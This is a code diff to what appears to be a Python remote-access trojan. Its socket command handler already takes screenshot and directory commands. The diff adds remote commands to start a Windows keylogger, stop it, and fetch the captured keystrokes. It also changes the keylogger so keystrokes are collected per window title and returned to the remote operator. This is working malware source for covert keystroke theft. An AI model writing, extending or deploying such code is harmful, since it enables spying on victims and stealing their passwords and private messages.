@@ -319,6 +319,25 @@ class ChildSocket(threading.Thread):
                     except:
                         pass
                     stdoutput = 'audioStopped'
+                elif data.startswith('startKeylogger'):
+                    try:
+                        keylogger_thread = Key()
+                        keylogger_thread.start()
+                        stdoutput = 'keyloggerStarted'
+                    except:
+                        stdoutput = 'keyloggerError'
+                elif data.startswith('stopKeylogger'):
+                    try:
+                        keylogger_thread.keyLogger.uninstall_hook_proc()
+                    except:
+                        pass
+                    stdoutput = 'keyloggerStopped'
+                elif data.startswith('getKeystokes'):
+                    try:
+                        stdoutput = str(keylogger_thread.logs)
+                        keylogger_thread.logs = {}
+                    except AttributeError:
+                        stdoutput = 'keystokesError'
                 elif data.startswith('getScreenshot'):
                     stdoutput = get_screenshot()
                 elif data.startswith("cd"):
@@ -384,24 +403,24 @@ class KeyLogger:
         return True
 
     def uninstall_hook_proc(self):
-        pass
+        if self.hooked is None:
+            return
+        ctypes.windll.user32.UnhookWindowsHookEx(self.hooked)
+        self.hooked = None
 
 
 class Key(threading.Thread):
     def __init__(self):
         super(Key, self).__init__()
 
-        self.window_title = ''
+        self.logs = {}
 
     def write_key(self, log):
         current_window_title = get_window_title()
-        if current_window_title != self.window_title:
-            print current_window_title
-            print '\n'
-            print log
-            print '\n\n\n'
-            self.window_title = current_window_title
-        #logs += log
+        if self.logs.has_key(current_window_title):
+            self.logs[current_window_title] += log
+        else:
+            self.logs[current_window_title] = log
 
     def hook_proc(self, n_code, w_param, l_param):
 
